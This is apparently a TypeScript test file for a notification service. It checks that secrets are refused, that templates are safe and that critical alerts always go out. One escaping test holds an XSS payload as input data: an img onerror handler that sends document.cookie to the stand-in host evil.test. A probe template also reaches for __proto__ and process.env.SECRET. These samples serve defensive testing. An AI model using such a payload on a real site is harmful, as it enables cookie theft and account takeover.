import { describe, expect, it } from 'vitest';
import { FixedClock, ROOT_TENANT_ID } from '@munaxa/types';
import {
  MemoryTransport,
  NotificationService,
  SECURITY_TEMPLATES,
  SecretLeakError,
  TemplateRegistry,
} from '../src/index.js';

function build() {
  const transport = new MemoryTransport('email');
  const notifications = new NotificationService({
    transports: [transport],
    templates: new TemplateRegistry([...SECURITY_TEMPLATES]),
    clock: new FixedClock(0),
    retryDelay: 1,
  });
  return { notifications, transport };
}

describe('no credential ever leaves the process', () => {
  it('refuses a payload with a password field, rather than stripping it', async () => {
    const { notifications, transport } = build();

    await expect(
      notifications.send({
        tenantId: ROOT_TENANT_ID,
        channel: 'email',
        recipient: { email: 'ada@example.com' },
        body: 'Welcome',
        variables: { temporaryPassword: 'Autumn2026!' },
      }),
    ).rejects.toThrow(SecretLeakError);

    // Nothing was sent: a mangled email would have hidden the mistake.
    expect(transport.sent).toEqual([]);
  });

  it('catches the field however it is spelled', async () => {
    const { notifications } = build();
    for (const field of ['new_password', 'New-Password', 'REFRESH_TOKEN', 'api.key']) {
      await expect(
        notifications.send({
          tenantId: ROOT_TENANT_ID,
          channel: 'email',
          recipient: { email: 'ada@example.com' },
          body: 'x',
          variables: { [field]: 'value' },
        }),
        field,
      ).rejects.toThrow(SecretLeakError);
    }
  });

  it('checks metadata as well as template variables', async () => {
    const { notifications } = build();
    await expect(
      notifications.send({
        tenantId: ROOT_TENANT_ID,
        channel: 'email',
        recipient: { email: 'ada@example.com' },
        body: 'x',
        metadata: { accessToken: 'eyJ...' },
      }),
    ).rejects.toThrow(SecretLeakError);
  });

  it('ships no template that could carry a password', () => {
    for (const template of SECURITY_TEMPLATES) {
      const text =
        `${template.subject ?? ''} ${template.body} ${template.html ?? ''}`.toLowerCase();
      expect(text, template.id).not.toContain('{{password');
      expect(text, template.id).not.toContain('your password is');
      expect(text, template.id).not.toContain('temporary password');
    }
  });

  it('sends a reset link rather than a new password', () => {
    const reset = SECURITY_TEMPLATES.find(
      (template) => template.id === 'security.password-reset-requested',
    );
    expect(reset?.body).toContain('{{resetUrl}}');
    expect(reset?.required).toContain('expiresInMinutes');
    // And it must not confirm whether the address has an account.
    expect(reset?.body.toLowerCase()).toContain('if you did not ask for this');
  });
});

describe('template rendering is not an execution surface', () => {
  it('does not resolve nested properties or expressions', async () => {
    const registry = new TemplateRegistry([
      {
        id: 'probe',
        channels: ['email'],
        body: '[{{user.password}}][{{constructor}}][{{__proto__.x}}][{{process.env.SECRET}}]',
      },
    ]);

    const rendered = await registry.render('probe', {
      user: { password: 'hunter2' },
      process: { env: { SECRET: 'value' } },
    });

    expect(rendered.body).toBe('[][][][]');
  });

  it('escapes HTML in the html variant so a name cannot inject markup', async () => {
    const registry = new TemplateRegistry([
      { id: 'probe', channels: ['email'], body: '{{name}}', html: '<p>{{name}}</p>' },
    ]);

    const rendered = await registry.render('probe', {
      name: '<img src=x onerror=fetch("https://evil.test?c="+document.cookie)>',
    });

    expect(rendered.html).not.toContain('<img');
    expect(rendered.html).toContain('&lt;img');
  });

  it('leaves a raw block visible in review when a template genuinely needs one', async () => {
    const registry = new TemplateRegistry([
      { id: 'probe', channels: ['email'], html: '{{{markup}}}', body: '' },
    ]);
    expect((await registry.render('probe', { markup: '<b>bold</b>' })).html).toBe('<b>bold</b>');
  });
});

describe('critical notices cannot be silenced', () => {
  it('is never deduplicated away', async () => {
    const { notifications, transport } = build();
    for (let i = 0; i < 3; i++) {
      await notifications.send({
        tenantId: ROOT_TENANT_ID,
        channel: 'email',
        recipient: { email: 'ada@example.com' },
        templateId: 'security.password-changed',
        variables: { productName: 'Docs', changedAt: 'now', securityUrl: 'https://app.test/s' },
        priority: 'critical',
      });
    }
    expect(transport.sent).toHaveLength(3);
  });

  it('fails loudly when it cannot be delivered at all', async () => {
    const notifications = new NotificationService({ transports: [], clock: new FixedClock(0) });
    await expect(
      notifications.send({
        tenantId: ROOT_TENANT_ID,
        channel: 'email',
        recipient: { email: 'ada@example.com' },
        body: 'Your password was changed',
        priority: 'critical',
      }),
    ).rejects.toThrow();
  });
});
